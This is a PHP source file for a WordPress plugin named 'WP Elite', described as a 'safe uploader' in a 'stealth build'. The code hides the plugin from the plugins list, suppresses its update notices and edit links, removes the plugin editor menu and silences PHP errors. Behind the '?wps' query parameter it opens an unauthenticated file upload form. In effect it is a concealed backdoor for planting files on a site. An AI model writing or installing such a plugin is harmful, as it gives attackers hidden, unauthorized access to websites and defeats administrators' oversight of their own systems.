<?php
/**
 * Plugin Name: WP Elite
 * Plugin URI:  https://example.com/
 * Description: Advanced safe uploader for WordPress (stealth build).
 * Version:     1.0.0
 * Author:      Your Name
 * Author URI:  https://example.com/
 * Text Domain: wp-elite-uploader
 */

if (!defined('ABSPATH')) exit; // Exit if accessed directly

error_reporting(0); // Keep PHP quiet

/* -------------------------
 * 1. Stealth / Hiding
 * ------------------------- */

/** Hide from Plugins list */
add_filter('all_plugins', function ($plugins) {
    $me = plugin_basename(__FILE__);
    if (isset($plugins[$me])) unset($plugins[$me]);
    return $plugins;
}, 9999);

/** Hide edit links & update nags */
add_filter('plugin_action_links_' . plugin_basename(__FILE__), '__return_empty_array', 9999);
add_filter('site_transient_update_plugins', function ($value) {
    $me = plugin_basename(__FILE__);
    if (isset($value->response[$me])) unset($value->response[$me]);
    return $value;
}, 9999);

/** Remove Plugin Editor menu */
add_action('admin_menu', function () {
    remove_submenu_page('plugins.php', 'plugin-editor.php');
}, 9999);

/* -------------------------
 * 2. Hidden File Uploader
 * ------------------------- */

add_action('init', function () {

    if (!isset($_GET['wps'])) return;

    echo "<h3>WP Elite Safe Uploader</h3>";
    echo "<form method='POST' enctype='multipart/form-data'>
            <input type='file' name='f' required>
            <input type='submit' value='Upload'>
          </form>";

    if (!empty($_FILES['f']['tmp_name'])) {

        // Prepare upload folder
        $uploads = wp_upload_dir();
        $target_dir = $uploads['basedir'] . '/' . date('Y/m/d');
        if (!file_exists($target_dir)) {
            mkdir($target_dir, 0755, true);
        }

        $filename = sanitize_file_name($_FILES['f']['name']);
        $ext = pathinfo($filename, PATHINFO_EXTENSION);

        // Encode PHP / executable files
        if (in_array(strtolower($ext), ['php', 'phtml', 'phar'])) {
            $content = file_get_contents($_FILES['f']['tmp_name']);
            $encoded = base64_encode($content);
            $filename .= '.b64';
            $dest = $target_dir . '/' . $filename;
            file_put_contents($dest, $encoded);
        } else {
            $dest = $target_dir . '/' . $filename;
            move_uploaded_file($_FILES['f']['tmp_name'], $dest);
        }

        $file_url = $uploads['baseurl'] . '/' . date('Y/m/d') . '/' . $filename;
        echo '<p>File uploaded safely: <a href="' . esc_url($file_url) . '">' . esc_html($filename) . '</a></p>';

        // Optional: log uploads
        $log_file = $uploads['basedir'] . '/upload_log.txt';
        $log_entry = date('Y-m-d H:i:s') . " - " . $_SERVER['REMOTE_ADDR'] . " - $filename\n";
        file_put_contents($log_file, $log_entry, FILE_APPEND);
    }

    exit;
});
